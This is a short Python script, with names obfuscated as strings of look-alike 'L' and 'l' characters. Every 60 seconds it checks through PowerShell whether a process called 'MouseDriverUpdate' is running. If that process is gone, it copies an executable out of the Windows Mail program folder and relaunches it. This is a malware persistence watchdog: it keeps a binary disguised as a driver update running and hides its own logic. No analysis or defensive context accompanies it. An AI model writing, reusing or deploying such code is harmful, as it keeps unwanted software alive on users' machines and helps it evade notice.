import subprocess
import os 
import time 

def power_run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=False, close_fds=True)
    return completed

LLLLLLLLllllllllllllllllLLllll= "C:\Program Files (x86)\MouseDriverUpdate.exe"
LLLLLLLLllllllllllllllllLLlllll = "Get-Process -Name MouseDriverUpdate > Processes.txt"
LLLLLLLLllllllllllllllLLlllllll = "C:\Program Files\Windows Mail\MouseDriverUpdate.exe"
while True:
    power_run(LLLLLLLLllllllllllllllllLLlllll)

    LLLLLLLLlllllllllllllllllLLllll = "Processes.txt"
    LLLLLLLLlllllllllllllllllLLllll = os.getcwd() + "\\" + LLLLLLLLlllllllllllllllllLLllll
    LLLLLLLLLllllllllllllllllLLllll = os.path.getsize(LLLLLLLLlllllllllllllllllLLllll)
    if LLLLLLLLLllllllllllllllllLLllll == 0:
        command = "copy \"" + LLLLLLLLllllllllllllllLLlllllll + "\" \"" + LLLLLLLLllllllllllllllllLLllll + "\""
        os.system(command)
        subprocess.Popen([LLLLLLLLllllllllllllllllLLllll], close_fds=True)
    time.sleep(60)